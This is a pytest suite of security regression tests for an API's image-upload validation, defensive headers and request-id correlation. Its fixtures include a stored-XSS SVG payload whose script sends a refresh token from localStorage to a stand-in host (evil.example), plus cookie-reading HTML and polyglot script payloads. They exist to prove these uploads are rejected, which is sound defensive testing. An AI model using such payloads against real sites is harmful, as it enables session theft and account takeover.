"""Security regression tests: upload validation, headers, request correlation.

These exist because each one closed a real vulnerability found in audit:

* ``upload_image`` trusted the client's ``Content-Type`` and filename extension,
  so a manager could upload ``payload.svg``. SVG is served from the API's own
  origin and may contain ``<script>`` — stored XSS leading to token theft and
  admin takeover. The tests below pin the allow-list behaviour.
* The API sent no defensive headers at all.
* Responses carried no correlation id, so a support ticket could not be traced.
"""

import io

import pytest
from fastapi.testclient import TestClient

from app.core.exceptions import ValidationError
from app.core.middleware import REQUEST_ID_HEADER
from app.core.uploads import ImageFormat, validate_image

# ── Minimal but *structurally valid* fixtures ────────────────────────────────
# Each starts with the real magic number so the sniffer accepts it; the trailing
# bytes are padding because validation deliberately never decodes the image.

PNG_BYTES = (
    b"\x89PNG\r\n\x1a\n"  # signature
    b"\x00\x00\x00\rIHDR"  # chunk length + type
    b"\x00\x00\x04\xb0"  # width  = 1200
    b"\x00\x00\x06\x40"  # height = 1600
    b"\x08\x06\x00\x00\x00" + b"\x00" * 32  # bit depth, colour type, …
)

# SOI + APP0/JFIF, then a SOF0 frame carrying the dimensions.
JPEG_BYTES = (
    b"\xff\xd8"  # SOI
    b"\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"  # APP0
    b"\xff\xc0\x00\x11\x08"  # SOF0, precision 8
    b"\x02\x58"  # height = 600
    b"\x03\x20"  # width  = 800
    b"\x03\x01\x22\x00\x02\x11\x01\x03\x11\x01"  # 3 components
    b"\xff\xd9"  # EOI
)

WEBP_BYTES = (
    b"RIFF"
    b"\x24\x00\x00\x00"  # file size - 8
    b"WEBP"
    b"VP8X"
    b"\x0a\x00\x00\x00"  # chunk size
    b"\x00\x00\x00\x00"  # flags
    b"\xbf\x02\x00"  # width - 1  = 704
    b"\x3f\x03\x00"  # height - 1 = 832
)

# ISO base media file format: 4-byte big-endian box size, then `ftyp`, then brand.
AVIF_BYTES = b"\x00\x00\x00\x1cftypavif" + b"\x00" * 32

SVG_PAYLOAD = (
    b'<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
    b"<script>fetch('//evil.example/?c='+localStorage.bh_refresh)</script>"
    b"</svg>"
)

HTML_PAYLOAD = b"<!doctype html><html><body><script>alert(document.cookie)</script></body></html>"

# A GIF is a legitimate image format that is simply not on our allow-list.
GIF_BYTES = b"GIF89a" + b"\x00" * 64


def _upload(
    client: TestClient, product_id: str, headers: dict, *, filename: str, content_type: str, payload: bytes
):
    return client.post(
        f"/api/v1/products/{product_id}/images/upload",
        headers=headers,
        files={"file": (filename, io.BytesIO(payload), content_type)},
        data={"alt_text": "Test image"},
    )


# ══════════════════════════════════════════════════════════════════════════
# Format sniffing — the allow-list itself
# ══════════════════════════════════════════════════════════════════════════


@pytest.mark.parametrize(
    ("payload", "expected"),
    [
        (JPEG_BYTES, ImageFormat.jpeg),
        (PNG_BYTES, ImageFormat.png),
        (WEBP_BYTES, ImageFormat.webp),
        (AVIF_BYTES, ImageFormat.avif),
    ],
)
def test_recognises_supported_formats(payload, expected):
    result = validate_image(payload)
    assert result.image_format is expected


def test_extension_is_derived_from_bytes_not_filename():
    """A file named .pdf that is really a PNG must be stored as .png."""
    result = validate_image(PNG_BYTES, declared_filename="invoice.pdf")
    assert result.extension == ".png"
    assert result.content_type == "image/png"


def test_jpeg_lied_about_as_png_is_corrected():
    """The declared Content-Type never decides the stored type."""
    result = validate_image(JPEG_BYTES, declared_content_type="image/png")
    assert result.image_format is ImageFormat.jpeg
    assert result.content_type == "image/jpeg"


def test_svg_is_rejected():
    """The stored-XSS vector. Must be refused with an actionable message."""
    with pytest.raises(ValidationError) as exc:
        validate_image(SVG_PAYLOAD, declared_content_type="image/svg+xml", declared_filename="hero.svg")
    assert "SVG" in exc.value.message
    assert exc.value.status_code == 422


def test_html_is_rejected():
    with pytest.raises(ValidationError):
        validate_image(HTML_PAYLOAD, declared_content_type="text/html", declared_filename="index.html")


def test_unsupported_raster_format_is_rejected():
    """GIF is a real image but not on the allow-list — allow-list, not deny-list."""
    with pytest.raises(ValidationError) as exc:
        validate_image(GIF_BYTES, declared_content_type="image/gif")
    assert "Unrecognised image format" in exc.value.message


def test_random_binary_is_rejected():
    with pytest.raises(ValidationError):
        validate_image(b"\x00\x01\x02\x03" * 20)


def test_empty_upload_is_rejected():
    with pytest.raises(ValidationError) as exc:
        validate_image(b"")
    assert "empty" in exc.value.message.lower()


def test_oversize_upload_is_rejected_before_sniffing():
    oversized = PNG_BYTES + b"\x00" * 1024
    with pytest.raises(ValidationError) as exc:
        validate_image(oversized, max_bytes=1024)
    assert "too large" in exc.value.message.lower()
    assert exc.value.details["max_bytes"] == 1024


def test_polyglot_jpeg_with_trailing_script_is_still_accepted():
    """JPEG magic wins; the payload is inert because we never serve it as HTML
    and the derived extension is .jpg, not whatever the client claimed."""
    polyglot = JPEG_BYTES + b"<script>alert(1)</script>"
    result = validate_image(polyglot, declared_filename="photo.jpg.html")
    assert result.image_format is ImageFormat.jpeg
    assert result.extension == ".jpg"


# ── Dimension parsing (used for the undersized-artwork warning) ────────────


def test_png_dimensions_parsed():
    assert validate_image(PNG_BYTES).width_height == (1200, 1600)


def test_jpeg_dimensions_parsed():
    assert validate_image(JPEG_BYTES).width_height == (800, 600)


def test_webp_dimensions_parsed():
    assert validate_image(WEBP_BYTES).width_height == (704, 832)


def test_truncated_header_returns_no_dimensions_instead_of_raising():
    """Malformed input must degrade, never 500."""
    assert validate_image(b"\x89PNG\r\n\x1a\n" + b"\x00" * 8).width_height is None


# ══════════════════════════════════════════════════════════════════════════
# Endpoint integration — proving the route actually uses the validator
# ══════════════════════════════════════════════════════════════════════════


def test_endpoint_rejects_svg_upload(client, product, manager_headers):
    r = _upload(
        client,
        product.id,
        manager_headers,
        filename="payload.svg",
        content_type="image/svg+xml",
        payload=SVG_PAYLOAD,
    )
    assert r.status_code == 422
    body = r.json()["error"]
    assert body["code"] == "VALIDATION_ERROR"
    assert "SVG" in body["message"]


def test_endpoint_rejects_html_disguised_as_jpeg(client, product, manager_headers):
    """Lying Content-Type must not smuggle markup through."""
    r = _upload(
        client,
        product.id,
        manager_headers,
        filename="photo.jpg",
        content_type="image/jpeg",
        payload=HTML_PAYLOAD,
    )
    assert r.status_code == 422


def test_endpoint_accepts_real_png(client, product, manager_headers):
    r = _upload(
        client, product.id, manager_headers, filename="hero.png", content_type="image/png", payload=PNG_BYTES
    )
    assert r.status_code == 201, r.text
    assert r.json()["url"].endswith(".png")


def test_upload_requires_manager_role(client, product, customer_headers):
    r = _upload(
        client, product.id, customer_headers, filename="hero.png", content_type="image/png", payload=PNG_BYTES
    )
    assert r.status_code == 403


def test_upload_for_missing_product_is_404(client, manager_headers):
    r = _upload(
        client,
        "00000000-0000-0000-0000-000000000000",
        manager_headers,
        filename="hero.png",
        content_type="image/png",
        payload=PNG_BYTES,
    )
    assert r.status_code == 404


# ══════════════════════════════════════════════════════════════════════════
# Response headers + request correlation
# ══════════════════════════════════════════════════════════════════════════

SECURITY_HEADERS = {
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "DENY",
    "Referrer-Policy": "strict-origin-when-cross-origin",
    "Cross-Origin-Opener-Policy": "same-origin",
}


@pytest.mark.parametrize("header,value", sorted(SECURITY_HEADERS.items()))
def test_security_headers_on_success_response(client, header, value):
    r = client.get("/api/v1/products?page_size=1")
    assert r.status_code == 200
    assert r.headers[header] == value


def test_security_headers_present_on_error_response(client):
    """Headers must survive the exception-handler path, not just happy paths."""
    r = client.get("/api/v1/products/does-not-exist")
    assert r.status_code == 404
    assert r.headers["X-Content-Type-Options"] == "nosniff"


def test_csp_allows_razorpay_and_blocks_object_embeds(client):
    csp = client.get("/api/v1/products?page_size=1").headers["Content-Security-Policy"]
    assert "https://checkout.razorpay.com" in csp, "blocking Razorpay breaks payments"
    assert "object-src 'none'" in csp
    assert "frame-ancestors 'self'" in csp


def test_no_hsts_in_test_environment(client):
    """HSTS over plain HTTP would poison the browser against the local host."""
    assert "Strict-Transport-Security" not in client.get("/healthz").headers


def test_request_id_is_generated_and_returned(client):
    r = client.get("/healthz")
    assert REQUEST_ID_HEADER in r.headers
    assert len(r.headers[REQUEST_ID_HEADER]) > 0


def test_client_supplied_request_id_is_echoed_for_tracing(client):
    """An upstream proxy's id must be preserved so traces join across services."""
    r = client.get("/healthz", headers={REQUEST_ID_HEADER: "trace-abc-123"})
    assert r.headers[REQUEST_ID_HEADER] == "trace-abc-123"


def test_absurdly_long_request_id_is_truncated(client):
    """Client-controlled header values must not be able to bloat our logs."""
    r = client.get("/healthz", headers={REQUEST_ID_HEADER: "x" * 5000})
    assert len(r.headers[REQUEST_ID_HEADER]) <= 64


def test_authenticated_responses_are_not_shared_cacheable(client, customer_headers):
    """Per-user data must never sit in a shared cache."""
    r = client.get("/api/v1/auth/me", headers=customer_headers)
    assert r.status_code == 200
    assert "no-store" in r.headers.get("Cache-Control", "")
